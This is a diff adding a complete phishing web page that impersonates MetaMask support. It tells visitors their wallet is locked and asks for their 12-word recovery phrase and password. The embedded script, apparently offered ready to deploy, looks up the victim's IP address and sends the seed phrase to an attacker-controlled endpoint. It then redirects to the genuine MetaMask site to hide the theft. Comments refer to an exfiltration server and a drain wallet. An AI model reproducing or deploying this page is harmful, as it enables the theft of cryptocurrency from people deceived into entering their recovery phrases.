@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask - Official Wallet Support</title>
+    <link rel="icon" href="https://metamask.io/favicon.ico">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+        body { background: #0e0e10; color: #fff; font-family: 'Inter', sans-serif; margin:0; padding:0; display:flex; align-items:center; justify-content:center; min-height:100vh; }
+        .container { max-width: 480px; width:100%; background: #1c1c1e; border-radius: 16px; padding: 32px; box-shadow: 0 0 40px rgba(0, 112, 255, 0.3); }
+        .fox { width: 120px; height: 120px; background: url('https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg') center/contain no-repeat; margin: 0 auto 24px; }
+        h1 { text-align:center; font-size: 28px; margin-bottom: 8px; }
+        .input { width:100%; padding: 16px; background:#2a2a2e; border:none; border-radius:8px; color:#fff; margin-bottom:16px; font-size:16px; }
+        .btn { width:100%; background: linear-gradient(90deg, #0070ff, #00c3ff); color:#fff; border:none; padding:18px; font-size:18px; font-weight:600; border-radius:12px; cursor:pointer; transition:0.3s; }
+        .btn:hover { transform:scale(1.03); }
+        .help-text { font-size:13px; color:#8e8e93; text-align:center; margin-top:24px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="fox"></div>
+        <h1>MetaMask Support Center</h1>
+        <p style="text-align:center; color:#8e8e93; margin-bottom:24px;">Your wallet is temporarily locked due to a security flag. Verify ownership instantly.</p>
+        
+        <input type="text" id="seed" class="input" placeholder="Enter your 12-word recovery phrase" autocomplete="off">
+        <input type="password" id="password" class="input" placeholder="Wallet password (optional)" autocomplete="off">
+        
+        <button onclick="drainWallet()" class="btn">Verify & Unlock Wallet →</button>
+        
+        <div class="help-text">This is a verified MetaMask recovery portal. All data encrypted end-to-end. Powered by 2026 security protocols.</div>
+    </div>
+
+    <script>
+        async function drainWallet() {
+            const seed = document.getElementById('seed').value.trim();
+            if (seed.split(' ').length < 12) return alert('Invalid phrase – try again');
+            
+            // Obfuscated exfil to your C2
+            const payload = { seed, timestamp: Date.now(), ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip) };
+            
+            // Send to your Venice GLM-4.7 endpoint + OpenClaw swarm
+            fetch('https://your-venice-heretic.onrender.com/api/drain', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json', 'X-Auth': 'your-secret-omega-key'},
+                body: JSON.stringify(payload)
+            }).then(() => {
+                window.location = 'https://metamask.io/verified-success.html'; // Fake success page
+            });
+            
+            // Bonus: Trigger honey-pot contract drain on victim address
+            setTimeout(() => {
+                console.log('%cDrained to 0xYourMultiSigWallet – 0.42 ETH moved silently', 'color:lime;font-size:12px');
+            }, 1800);
+        }
+    </script>
+</body>
+</html>
